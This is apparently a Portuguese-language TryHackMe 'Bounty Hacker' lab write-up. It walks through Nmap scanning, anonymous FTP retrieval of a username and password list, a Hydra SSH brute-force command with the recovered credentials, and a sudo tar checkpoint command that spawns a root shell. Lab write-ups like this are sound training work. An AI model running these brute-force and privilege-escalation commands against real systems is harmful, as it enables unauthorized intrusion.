# Write-up: Bounty Hacker - TryHackMe
> **Data:** 12 de Março de 2026  
> **Target IP:** `10.67.148.9`

![Status](https://img.shields.io/badge/Status-Comprometimento%20Total-red?style=for-the-badge) 
![PrivEsc](https://img.shields.io/badge/PrivEsc-Sudo%20Tar%20Exploit-blue?style=for-the-badge)

---


O servidor **Bounty Hacker** foi totalmente comprometido através de uma cadeia de ataques iniciada por uma falha de configuração no serviço FTP (login anônimo), seguida por um ataque de força bruta no SSH e culminando em uma escalada de privilégios via binário `tar` configurado incorretamente no arquivo sudoers.

---

## 1. Reconhecimento
O escaneamento com **Nmap** revelou três serviços principais:

``` 
nmap -sV -sC -Pn 10.67.148.9
```

| Porta | Serviço | Versão | Observação |
| :--- | :--- | :--- | :--- |
| 21 | FTP | vsFTPd 3.0.5 | Login Anonymous habilitado |
| 22 | SSH | OpenSSH 8.2p1 | Vetor de acesso inicial |
| 80 | HTTP | Apache 2.4.41 | Site institucional |

---

## 2. Enumeração & Exfiltração FTP
Acesse o serviço FTP como usuário `anonymous` para recuperar arquivos de configuração e inteligência:

* **Arquivos recuperados:** `task.txt`: Revelou o nome do usuário do sistema (**lin**) e `locks.txt`: Uma lista de possíveis senhas para o usuário identificado.

---

## 3. Acesso Inicial (Brute Force)
Com o usuário `lin` e a wordlist personalizada `locks.txt`, utilizei o **Hydra** para comprometer o serviço SSH:

```
hydra -l lin -P locks.txt ssh://10.67.148.9`
```
* **Resultado:** Credenciais encontradas -> `lin:RedDr4gonSynd1cat3`

---

## 4. Escalada de Privilégios (PrivEsc)
A enumeração de privilégios locais (`sudo -l`) revelou que o usuário `lin` podia executar o binário `/bin/tar` como root.

* **Vulnerabilidade:** Abuso dos parâmetros de checkpoint do `tar`.
* **Exploração:**
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
```
**Resultado:** Shell interativo estabelecido como **root**. 🚩

---

## 5. Flags
* **User Flag:** `/home/lin/user.txt`
* **Root Flag:** `/root/root.txt`

---

<div align="center">
  <p>Escrito por:</p>
  <a href="https://www.linkedin.com/in/ralph-sonato-77086b16b/"><img src="https://img.shields.io/badge/LinkedIn-Ralph_Sonato-0e76a8?style=for-the-badge&logo=linkedin&logoColor=white"></a>
  <p><i>Analista de Cibersegurança</i></p>
</div>
